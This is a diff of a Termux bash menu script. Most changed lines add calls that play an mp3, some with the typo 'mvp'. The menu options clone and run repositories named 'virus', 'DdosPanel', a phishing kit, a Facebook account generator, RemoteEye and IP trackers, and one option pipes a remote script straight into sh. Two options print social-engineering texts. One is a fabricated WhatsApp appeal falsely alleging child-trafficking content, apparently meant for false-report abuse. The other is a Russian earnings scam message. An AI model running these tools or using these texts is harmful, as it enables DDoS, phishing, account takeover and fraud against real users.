@@ -51,7 +51,7 @@ read -p "╚════ROOT®KALI════> : " p
 if [ $p == 1 ]
 then
 clear
-mpv phonk3.mp3
+mpv phonk.mp3
 git clone https://github.com/Kingcy78/virus
 cd virus
 bash PREM2.sh
@@ -59,7 +59,7 @@ fi
 if [ $p == 2 ]
 then
 clear
-mpv araara.mp3
+mpv phonk.mp3
 git clone https://github.com/Kingcy78/bot
 cd bot
 bash BOT-VIIP.sh
@@ -74,6 +74,8 @@ bash phising
 fi 
 if [ $p == 4 ]
 then
+clear
+mpv phonk.mp3
 pkg update && pkg upgrade 
 pkg install python
 pkg install python2
@@ -85,6 +87,8 @@ sh install.sh
 fi
 if [ $p == 5 ]
 then
+clear
+mpv phonk.mp3
 git clone https://github.com/Achik-Ahmed/IG-OSINT-V2
 cd IG-OSINT-V2
 pip install instaloader
@@ -92,10 +96,13 @@ python ig.py
 fi
 if [ $p == 6 ]
 then
+clear
+mvp phonk.mp3
 echo "BUY ADMIN"
 fi
 if [ $p == 7 ]
 then
+mvp phonk.mp3
 git clone https://github.com/dandiers/DdosPanel.git
 cd DdosPanel
 pip install -r requirements.txt
@@ -104,10 +111,14 @@ fi
 if [ $p == 8 ]
 then
 clear
+mvp phonk.mp3
+
 echo "Lum whatsapp, orang Jepang tak dikenal mengambil alih whatsapp saya, dia menggunakan whatsapp saya untuk menjual 172 video porno dan 13 anak kecil untuk dijual dan diperkosa oleh pembeli, dia juga mengancam saya jika saya tidak memberikan whatsapp saya keluarga saya akan dibunuh dan kakak saya akan mencoba, awalnya saya tidak percaya tetapi Dia tahu rumah keluarga saya dan setelah pria Jepang itu menggunakan whatsapp saya dan saya akan menggunakan whatsapp saya nomor whatsapp saya diblokir setelah itu baca artikel di whatsapp tentang memperlakukan orang Jepang laki-laki itu melanggar ketentuan layanan yang ditemukan di whatsapp setelah saya menggunakan whatsapp pribadi saya. Saya benar-benar memohon kepada whatsapp untuk membatalkan pemblokiran whatsapp saya dan memulihkan akun whatsapp saya terima kasih nomor whatsapp saya +62"
 fi
 if [ $p == 9 ]
 then
+clear
+mvp phonk.mp3
 echo "Здравствуйте, один из разработчиков WhatsApp работает над получением дополнительного дохода в размере 1,01 доллара.
 Разделите безумие и заработайте $ 1,22_ $ 5,22, используя платформу онлайн-покупок.
 Нажмите кнопку вызова внизу на 1 секунду.
@@ -119,6 +130,7 @@ fi
 if [ $p == 11 ]
 then
 clear
+mvp phonk.mp3
 git clone https://github.com/akshaybk/RemoteEye
 cd RemoteEye
 python remoteeye.py
@@ -126,6 +138,7 @@ fi
 if [ $p == 12 ]
 then
 clear
+mpv phonk.mp3
 git clone --depth 1 https://github.com/BINOD-XD/Ip-Tracker
 cd Ip-Tracker
 chmod +x install
@@ -134,6 +147,7 @@ fi
 if [ $p == 13 ]
 then
 clear
+mpv phonk.mp3
 termux-setup-storage
 apt update ; apt install curl -y ; curl https://raw.githubusercontent.com/xiv3r/Kali-Linux-Termux/refs/heads/main/install.sh | sh
 ./install-nethunter-termux
@@ -141,6 +155,7 @@ fi
 if [ $p == 14 ]
 then
 clear
+mpv phonk.mp3
 adb shell "/system/bin/dumpsys activity settings | grep max_phantom_processes"
 adb shell "/system/bin/dumpsys activity processes -a"
 adb shell "/system/bin/device_config set_sync_disabled_for_tests persistent"
@@ -150,6 +165,7 @@ fi
 if [ $p == 15 ]
 then
 clear
+mpv phonk.mp3
 pkg install git -y
 pkg install python -y
 git clone https://github.com/7wp81x/FBGen.git
@@ -159,6 +175,7 @@ fi
 if [ $p == 16 ]
 then
 clear
+mpv phonk.mp3
 pkg install php -y 
 git clone https://github.com/Kingcy78/H20
 cd H20
@@ -167,6 +184,7 @@ fi
 if [ $p == 17 ]
 then
 clear
+mpv phonk.mp3
 cd $HOME
 git clone https://github.com/TermuxHackz/X-osint
 cd X-osint
@@ -176,6 +194,7 @@ fi
 if [ $p == 18 ]
 then
 clear
+mpv phonk.mp3
 pkg install php -y
 pkg install nala -y
 nala install git bash -y
